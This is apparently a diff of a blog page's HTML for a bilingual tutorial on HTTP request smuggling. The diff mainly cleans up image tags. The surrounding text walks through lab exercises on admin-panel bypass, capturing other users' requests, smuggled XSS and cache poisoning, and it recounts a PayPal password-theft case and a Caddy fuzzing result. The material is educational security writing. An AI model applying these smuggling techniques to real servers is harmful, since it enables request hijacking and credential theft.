 &lt;p>Remember to cancel BurpSuite&amp;rsquo;s automatic update Content-Length function before doing it.&lt;/p>
-&lt;p>Permalink before if: /20200520135762.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135762.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135762.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135762.jpg"
 width="2560"
 height="1612"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135762_hu9224663097241869685.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135762_hu17310890457722923580.jpg 1024w"
@@ -6333,8 +6293,7 @@ data-flex-basis="381px"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>We can send above requests twice.&lt;/p>
-&lt;p>Permalink before if: /20200520137370.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137370.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137370.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137370.jpg"
 width="2560"
 height="1612"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137370_hu11916626369167268387.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137370_hu11498493902907110470.jpg 1024w"
@@ -6343,8 +6302,7 @@ class="gallery-image"
 data-flex-grow="158"
 data-flex-basis="381px"
 >&lt;/p>
-&lt;p>Permalink before if: /20200520138381.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138381.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138381.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138381.jpg"
 width="2560"
 height="1612"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138381_hu543459283310592589.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138381_hu13871233457084691988.jpg 1024w"
@@ -6466,8 +6424,7 @@ data-flex-basis="381px"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>Here we can send more than two HTTP request packets, and we can receive the response as shown below.&lt;/p>
-&lt;p>Permalink before if: /20200520139652.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139652.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139652.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139652.png"
 width="1912"
 height="666"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139652_hu2680327336237389883.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139652_hu3112262699823936216.png 1024w"
@@ -6537,8 +6494,7 @@ data-flex-basis="689px"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>We can get the response as shown below.&lt;/p>
-&lt;p>Permalink before if: /20200520132864.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132864.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132864.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132864.png"
 width="1872"
 height="472"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132864_hu6444919021265153472.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132864_hu4138394376496059598.png 1024w"
@@ -6644,8 +6600,7 @@ data-flex-basis="951px"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>The response obtained is as follows.&lt;/p>
-&lt;p>Permalink before if: /20200520132539.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132539.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132539.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132539.png"
 width="2732"
 height="1104"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132539_hu1901201770189271020.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132539_hu6156945116043746746.png 1024w"
@@ -6654,8 +6609,7 @@ class="gallery-image"
 data-flex-grow="247"
 data-flex-basis="593px"
 >&lt;/p>
-&lt;p>Permalink before if: /20200520138223.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138223.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138223.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138223.png"
 width="2692"
 height="1102"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138223_hu17547745283431769645.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138223_hu18285547313521134635.png 1024w"
@@ -6715,8 +6669,7 @@ data-flex-basis="586px"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>We can see that the content of the &lt;code>/admin&lt;/code> panel. If it dosen&amp;rsquo;t work, you can send it a few times.&lt;/p>
-&lt;p>Permalink before if: /20200520139301.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139301.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139301.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139301.png"
 width="2716"
 height="1084"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139301_hu16493646383542340932.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139301_hu8037578775062075579.png 1024w"
@@ -6762,8 +6715,7 @@ data-flex-basis="601px"
 &lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">Host: localhost
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: /20200520130304.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130304.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130304.png"
+&lt;/div>&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130304.png"
 width="2504"
 height="524"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130304_hu13681559329577807584.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130304_hu12373344721108514675.png 1024w"
@@ -6808,8 +6760,7 @@ data-flex-basis="1146px"
 &lt;p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.&lt;/p>
 &lt;/blockquote>
 &lt;p>According to the title hint here, the scene is a CL-TE scene and a search box is given. We try to search for a 123 at will. We can find that the search result &amp;ldquo;123&amp;rdquo; is directly echoed into the corresponding one.&lt;/p>
-&lt;p>Permalink before if: /20200520137721.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137721.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137721.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137721.png"
 width="2744"
 height="1160"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137721_hu11194640526033912323.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520137721_hu12449595934949905006.png 1024w"
@@ -6819,8 +6770,7 @@ data-flex-grow="236"
 data-flex-basis="567px"
 >&lt;/p>
 &lt;p>Attempted access using HTTP Smuggling, but was blocked.&lt;/p>
-&lt;p>Permalink before if: /20200520130471.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130471.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130471.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130471.png"
 width="2760"
 height="1136"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130471_hu17089660585004087172.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130471_hu12566631134217055282.png 1024w"
@@ -6830,8 +6780,7 @@ data-flex-grow="242"
 data-flex-basis="583px"
 >&lt;/p>
 &lt;p>But we can try to use the search echo to leak the request header forwarded by the Front server:&lt;/p>
-&lt;p>Permalink before if: /20200520136832.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136832.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136832.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136832.png"
 width="2746"
 height="1136"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136832_hu3059226855943406800.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136832_hu17283392566307769792.png 1024w"
@@ -6841,8 +6790,7 @@ data-flex-grow="241"
 data-flex-basis="580px"
 >&lt;/p>
 &lt;p>If you only add the X-*-Ip request header later, you cannot access the admin panel, because this will make Backend receive two duplicate request headers. In this scenario, the Backend server judges the duplicate request headers.&lt;/p>
-&lt;p>Permalink before if: /20200520132406.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132406.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132406.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132406.png"
 width="2376"
 height="600"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132406_hu15670288276320078857.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132406_hu6662881474894355412.png 1024w"
@@ -6852,8 +6800,7 @@ data-flex-grow="396"
 data-flex-basis="950px"
 >&lt;/p>
 &lt;p>So we need to &amp;ldquo;hide&amp;rdquo; the request headers added by the Front server, we can use Smuggling to &amp;ldquo;hide&amp;rdquo; the request headers added by other Front servers, and then we can get the admin panel.&lt;/p>
-&lt;p>Permalink before if: /20200520135698.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135698.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135698.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135698.png"
 width="2750"
 height="1128"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135698_hu11452297735184919906.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135698_hu16277179506480692847.png 1024w"
@@ -6944,8 +6891,7 @@ data-flex-basis="585px"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>As long as the later CL is large enough, we can use HTTP Smuggling to stitch the next user&amp;rsquo;s request into our last comment parameter, and then we can see the request header of others when we look at the comment.&lt;/p>
-&lt;p>Permalink before if: /20200520138700.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138700.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138700.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138700.png"
 width="1560"
 height="1296"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138700_hu10865603658508340635.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520138700_hu1465423320209369125.png 1024w"
@@ -6963,8 +6909,7 @@ data-flex-basis="288px"
 &lt;p>To solve the lab, smuggle a request to the back-end server that causes the next user&amp;rsquo;s request to receive a response containing an XSS exploit that executes alert(1).&lt;/p>
 &lt;/blockquote>
 &lt;p>Still in the CL-TE, we can find a reflection XSS at the UA, but this is useless, so we have to find some way to upgrade the hazard.&lt;/p>
-&lt;p>Permalink before if: /20200520139474.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139474.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139474.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139474.png"
 width="2750"
 height="1130"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139474_hu12041566055626438600.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139474_hu14815018341496326211.png 1024w"
@@ -7021,8 +6966,7 @@ data-flex-basis="584px"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>Then we casually visit any page on the site and it will &lt;code>alert(1)&lt;/code> because our request is embedded in the second request above.&lt;/p>
-&lt;p>Permalink before if: /20200520132106.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132106.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132106.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132106.png"
 width="2050"
 height="416"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132106_hu13255903199366847417.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132106_hu17619717793963650561.png 1024w"
@@ -7031,8 +6975,7 @@ class="gallery-image"
 data-flex-grow="492"
 data-flex-basis="1182px"
 >&lt;/p>
-&lt;p>Permalink before if: /20200520131892.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131892.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131892.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131892.png"
 width="2200"
 height="1524"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131892_hu15457895336069015610.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131892_hu11791026825345381755.png 1024w"
@@ -7128,8 +7071,7 @@ data-flex-basis="346px"
 &lt;/blockquote>
 &lt;p>This environment is also a scenario where the host can be modified to redirect, and the &lt;code>/post/next?postId=2&lt;/code> route redirect to &lt;code>/post?postId=4&lt;/code>.&lt;/p>
 &lt;p>According to the description of the call, we need to implement cache poisoning. For example, here we choose &lt;code>/resources/js/tracking.js&lt;/code> for poisoning. LAB also gives us a service for manufacturing poisoning, so we can set the following settings.&lt;/p>
-&lt;p>Permalink before if: /20200520130636.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130636.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130636.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130636.png"
 width="1488"
 height="1556"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130636_hu13925782281877713511.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130636_hu12048956975744927913.png 1024w"
@@ -7190,8 +7132,7 @@ data-flex-basis="229px"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>Then visit &lt;code>/resources/js/tracking.js&lt;/code>:&lt;/p>
-&lt;p>Permalink before if: /20200520135018.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135018.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135018.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135018.png"
 width="2706"
 height="384"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135018_hu11295813604526328408.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520135018_hu14771350924157855917.png 1024w"
@@ -7201,8 +7142,7 @@ data-flex-grow="704"
 data-flex-basis="1691px"
 >&lt;/p>
 &lt;p>We can see that the redirect address of the response packet has been changed to the our exploit address, and then we visit the normal server homepage.&lt;/p>
-&lt;p>Permalink before if: /20200520131794.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131794.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131794.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131794.png"
 width="1692"
 height="372"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131794_hu18282959232175854021.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131794_hu8710330653249629090.png 1024w"
@@ -7342,15 +7282,15 @@ data-flex-basis="1091px"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>But the Paypal login page has a CSP rule &lt;code>script-src&lt;/code> which block this redirect.&lt;/p>
-&lt;p>Permalink before if: https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg&lt;img src="https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg"
+&lt;p>&lt;img src="https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Later, the author noticed that the login page loads a sub-page on c.paypal.com in a dynamically generated iframe. This sub-page didn&amp;rsquo;t use CSP and also used a js file poisoned by the author! Although this can control the iframe page, because of the same-origin policy, the data of the parent page cannot be read.&lt;/p>
-&lt;p>Permalink before if: https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg&lt;img src="https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg"
+&lt;p>&lt;img src="https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg"
 loading="lazy"
 >&lt;/p>
 &lt;p>His colleague then discovered a page at paypal.com/us/gifts that didn&amp;rsquo;t use CSP, and also imported his poisoned JS file. By using his JS to redirect the c.paypal.com iframe to that URL (and triggering our JS import for the third time) he could finally access the parent and steal plaintext PayPal passwords from everyone who logged in using Safari or IE.&lt;/p>
-&lt;p>Permalink before if: https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg&lt;img src="https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg"
+&lt;p>&lt;img src="https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Paypal&amp;rsquo;s first fix was to modify the Akamai configuration to reject requests containing &lt;code>Transfer-Encoding: chunked&lt;/code>. But the author bypassed it quikly by constructing a newline header.&lt;/p>
@@ -7842,8 +7782,7 @@ loading="lazy"
 &lt;/h3>&lt;p>This is an interesting part. It was fuzzed at the beginning of October. Finally, I decided to test &lt;a class="link" href="https://caddyserver.com/v1/" target="_blank" rel="noopener"
 >caddy&lt;/a> , and took it to fuzz. Because I was lazy, I used the environment on the docker hub [caddy](https: //hub.docker. com/r/abiosoft/caddy).&lt;/p>
 &lt;p>So, here we are.&lt;/p>
-&lt;p>Permalink before if: /20200520139367.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139367.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139367.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139367.png"
 width="1728"
 height="542"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139367_hu11962043050288588303.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139367_hu14866363764108716228.png 1024w"
@@ -7880,8 +7819,7 @@ data-flex-basis="765px"
 &lt;p>Then I went to check the differences between HTTP/2 and HTTP/1.1. In my opinion, I think that Request multiplexing over a single TCP connection is mainly added to HTTP/2, which means that using HTTP/2 can use a single TCP connection to request resources. This reduces the possibility of TCP connection reuse, even if you can smuggle, you can only hit yourself and the introduction of a new binary framing mechanism also limits this attack. And more imporantly, &lt;code>Transfer-Encoding: chunk&lt;/code> is canceled in HTTP/2. :P&lt;/p>
 &lt;p>For details, please refer to &lt;a class="link" href="https://developers.google.com/web/fundamentals/performance/http2##%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener"
 >the introduction of HTTP / 2&lt;/a>&lt;/p>
-&lt;p>Permalink before if: /20200520132137.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132137.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132137.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132137.png"
 width="747"
 height="624"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132137_hu18302673968876475673.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520132137_hu12039292917733931143.png 1024w"
@@ -7919,7 +7857,7 @@ data-flex-basis="287px"
 &lt;p>后续如果有新的总结发现也会发自己的&lt;a class="link" href="https://zeddyu.github.io" target="_blank" rel="noopener"
 >垃圾博客&lt;/a>或者先知（就看国际黑客陈师傅给不给过了）&lt;/p>
 &lt;h1 id="tlnr">TL;NR
-&lt;/h1>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191205171217.jpeg&lt;img src="https://blogpic.zdy.one/img/20191205171217.jpeg"
+&lt;/h1>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191205171217.jpeg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Pic from &lt;a class="link" href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target="_blank" rel="noopener"
@@ -7959,7 +7897,7 @@ loading="lazy"
 &lt;p>现如今，浏览器默认是不启用&lt;code>Pipeline&lt;/code>的，但是一般的服务器都提供了对&lt;code>Pipleline&lt;/code>的支持。&lt;/p>
 &lt;/blockquote>
 &lt;p>在 HTTP/1.1 中比较重要的引入就是 pipeline 技术了，以下是使用以及不使用 piepeline 技术的对比图：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191017234109.png&lt;img src="https://blogpic.zdy.one/img/20191017234109.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191017234109.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以清晰地看到，使用了 pipeline 之后不必再需要等待前一个请求完成其响应再处理第二个请求了，这个有点异步处理的意思在里面。&lt;/p>
@@ -8096,17 +8034,17 @@ response if that amount is exceeded.&lt;/p>
 &lt;p>​ 为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。&lt;/p>
 &lt;/blockquote>
 &lt;p>这里引用 @mengchen 师傅发的图：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191205171057.png&lt;img src="https://blogpic.zdy.one/img/20191205171057.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191205171057.png"
 loading="lazy"
